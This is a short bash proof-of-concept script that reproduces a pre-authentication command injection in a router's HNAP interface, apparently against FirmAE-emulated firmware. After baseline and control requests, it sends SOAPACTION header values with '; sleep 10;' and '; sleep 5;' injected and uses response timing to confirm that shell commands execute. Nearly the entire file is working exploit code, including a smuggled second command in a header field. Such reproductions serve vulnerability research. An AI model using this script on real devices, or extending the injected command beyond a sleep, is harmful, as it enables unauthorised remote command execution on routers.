#!/bin/bash
# HNAP pre-auth command injection - FirmAE HTTP-level reproduction
# GET /HNAP1 + SOAPACTION substring auth-bypass + '; sleep N;' timing oracle
TARGET=http://192.168.0.1

req() {  # $1=SOAPACTION value, $2=label
    t0=$(date +%s.%N)
    curl -s -m 60 -o /tmp/hnap_resp.bin -w '%{http_code} %{size_download}' \
         -H "SOAPACTION: $1" "$TARGET/HNAP1/"
    rc=$?
    t1=$(date +%s.%N)
    el=$(echo "$t1 $t0" | awk '{printf "%.2f", $1-$2}')
    echo "  [$2] curl_rc=$rc elapsed=${el}s"
    head -c 120 /tmp/hnap_resp.bin | tr -d '\0' | head -2
    echo
}

echo "=== [1] BASELINE: normal GetDeviceSettings (pre-auth, no injection) ==="
req '"http://purenetworks.com/HNAP1/GetDeviceSettings"' baseline

echo "=== [2] CONTROL: unknown action, no injection ==="
req '"http://purenetworks.com/HNAP1/SomeOtherAction"' control

echo "=== [3] INJECTION: GetDeviceSettings/; sleep 10; ==="
req '"http://purenetworks.com/HNAP1/GetDeviceSettings/; sleep 10;"' inject-sleep10

echo "=== [4] INJECTION (repeat, smaller): ; sleep 5; ==="
req '"http://purenetworks.com/HNAP1/GetDeviceSettings/; sleep 5;"' inject-sleep5
